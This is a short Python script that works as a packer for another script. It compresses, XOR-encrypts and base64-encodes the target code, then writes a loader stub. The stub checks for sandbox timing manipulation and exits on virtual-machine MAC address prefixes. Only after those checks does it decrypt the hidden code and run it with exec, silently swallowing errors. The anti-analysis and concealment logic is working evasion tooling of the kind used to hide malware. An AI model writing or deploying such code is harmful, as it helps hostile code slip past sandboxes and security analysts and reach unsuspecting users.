import sys
import zlib
import base64
import marshal

def obfuscate_file(input_file, output_file):
    with open(input_file, 'r', encoding='utf-8') as f:
        source_code = f.read()

    compressed_code = zlib.compress(source_code.encode('utf-8'))
    
    b64_code = base64.b64encode(compressed_code).decode('utf-8')
    
    import os, random
    key = os.urandom(32)
    enc_code = bytes([a ^ key[i % 32] for i, a in enumerate(compressed_code)])
    b64_enc_code = base64.b64encode(enc_code).decode('utf-8')
    key_b64 = base64.b64encode(key).decode('utf-8')

    stub = f"""import zlib, base64, marshal, sys, time, os

t1 = time.time()
time.sleep(2)
t2 = time.time()
if (t2 - t1) < 1.5:
    sys.exit()

try:
    mac = os.popen("cat /sys/class/net/eth0/address 2>/dev/null").read().strip().lower()
    vm_macs = ['08:00:27', '00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '00:16:3e']
    if any(mac.startswith(m) for m in vm_macs):
        sys.exit()
except: pass

try:
    k = base64.b64decode('{key_b64}')
    e = base64.b64decode('{b64_enc_code}')
    d = bytes([a ^ k[i % 32] for i, a in enumerate(e)])
    exec(zlib.decompress(d).decode('utf-8'))
except Exception as e:
    pass
"""

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(stub)
        
    print(f"[+] Transformed {input_file} -> {output_file}")

if __name__ == '__main__':
    obfuscate_file('deploy.py', 'encoder.py')
